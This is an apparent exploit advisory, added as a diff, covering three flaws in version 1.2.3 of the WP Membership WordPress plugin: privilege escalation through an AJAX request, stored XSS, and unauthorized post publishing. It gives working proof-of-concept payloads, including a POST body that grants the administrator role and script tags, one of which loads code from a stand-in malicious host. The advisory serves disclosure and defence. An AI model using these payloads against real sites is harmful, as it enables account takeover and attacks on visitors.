@@ -1,0 +1,106 @@
+# Exploit Title: WordPress WP Membership plugin [Multiple Vulnerabilities]
+# Date: 2015/05/19
+# Exploit Author: Panagiotis Vagenas
+# Contact: https://twitter.com/panVagenas
+# Vendor Homepage: http://wpmembership.e-plugins.com/
+# Software Link: http://codecanyon.net/item/wp-membership/10066554
+# Version: 1.2.3
+# Tested on: WordPress 4.2.2
+# Category: webapps
+
+========================================
+* 1. Privilege escalation
+  ========================================
+
+1.1 Description
+
+Any registered user can perform a privilege escalation through 
+`iv_membership_update_user_settings` AJAX action.
+Although this exploit can be used to modify other plugin related data 
+(eg payment status and expiry date), privilege escalation can lead to a 
+serious incident because the malicious user can take administrative role 
+to the infected website.
+
+1.2 Proof of Concept
+
+* Login as regular user
+* Sent a POST request to `http://example.com/wp-admin/admin-ajax.php` 
+with data: 
+`action=iv_membership_update_user_settings&form_data=user_id%3D<yourUserID>%26user_role%3Dadministrator` 
+
+
+1.3 Actions taken after discovery
+
+Vendor was informed on 2015/05/19.
+
+1.4 Solution
+
+No official solution yet exists.
+
+========================================
+* 2. Stored XSS
+========================================
+
+2.1 Description
+
+All input fields from registered users aren't properly escaped. This 
+could lead to an XSS attack that could possibly affect all visitors of 
+the website, including administators.
+
+2.2 Proof of Concept
+
+* Login as regular user
+* Update any field of your profile appending at the end
+     `<script>alert('XSS');</script>`
+     or
+     `<script src=”http://malicious .server/my_malicious_script.js”/>`
+
+2.3 Actions taken after discovery
+
+Vendor was informed on 2015/05/19.
+
+2.4 Solution
+
+No official solution yet exists.
+
+========================================
+* 3. Unauthorized post publish and stored XSS
+  ========================================
+
+3.1 Description
+
+Registered users can publish a post without administrator confirmation. 
+Normally all posts submitted  by users registered with WP Membership 
+plugin are stored with the status `pending`. A malicious user though can 
+publish his post by crafting the form is used for submission.
+
+3.2 Proof of Concept
+
+* Login as regular user
+  whom belongs to a group that can submit new posts
+* Visit the `New Post` section at your profile
+* Change field `post_status`:
+     <select id="post_status" class="form-control" name="post_status">
+         <option value="publish" selected=”selected”>Pending 
+Review</option>
+         <option value="draft">Draft</option>
+     </select>
+
+The post gets immediately published after you submit the form and is 
+visible to all visitors of the website.
+
+In addition a stored XSS attack can be performed due to insufficient 
+escaping of the post content input.
+
+3.3 Actions taken after discovery
+
+Vendor was informed on 2015/05/19.
+
+3.4 Solution
+
+No official solution yet exists.
+
+3.5 Workaround
+
+Prevent users from submitting new posts through the relative option in 
+plugin's settings
